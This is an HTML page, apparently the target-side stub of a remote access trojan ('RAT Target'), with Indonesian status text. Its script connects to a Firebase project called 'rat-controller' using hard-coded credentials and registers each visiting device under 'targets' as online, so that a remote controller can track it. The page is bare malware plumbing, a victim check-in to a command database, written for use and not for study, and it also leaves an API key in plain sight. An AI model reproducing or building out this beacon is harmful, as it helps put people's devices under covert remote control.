<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAT</title>
</head>
<body>
    <h1>RAT Target</h1>
    <p id="status">Menghubungkan...</p>
    <p id="device"></p>
    
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <script>
        var firebaseConfig = {
            apiKey: "AIzaSyD4wbgxY6e6m0vHPOZykPuQdea8LdFkQsk",
            authDomain: "rat-controller-5b29c.firebaseapp.com",
            databaseURL: "https://rat-controller-5b29c-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "rat-controller-5b29c",
            storageBucket: "storage.googleapis.com",
            messagingSenderId: "928595828959",
            appId: "1:928595828959:web:e4715e3095f7456d5896a"
        };
        
        firebase.initializeApp(firebaseConfig);
        var db = firebase.database();
        var deviceId = 'dev_' + Date.now();
        
        db.ref('targets/' + deviceId).set({
            name: 'HP Target',
            online: true,
            status: 'online'
        }).then(function() {
            document.getElementById('status').innerHTML = '✅ ONLINE!';
            document.getElementById('status').style.color = 'green';
            document.getElementById('device').innerHTML = 'ID: ' + deviceId;
        }).catch(function(err) {
            document.getElementById('status').innerHTML = '❌ ERROR: ' + err.message;
            document.getElementById('status').style.color = 'red';
        });
    </script>
</body>
</html>
